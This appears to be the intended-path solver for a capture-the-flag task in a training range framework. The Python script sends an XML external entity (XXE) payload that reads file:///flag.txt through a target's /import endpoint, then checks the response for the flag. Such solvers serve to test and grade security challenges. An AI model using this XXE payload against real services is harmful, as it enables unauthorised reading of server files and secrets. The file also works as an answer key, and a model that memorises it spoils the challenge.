"""Intended-path solver: XXE file read via an external entity."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE import [<!ENTITY xxe SYSTEM "file:///flag.txt">]>'
    "<import><data>&xxe;</data></import>"
)


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.post(f"{ctx.url()}/import", content=PAYLOAD.encode(), timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="leak-flag-via-xxe",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"no flag in response (status {res.status_code})",
            )
        ]
    )
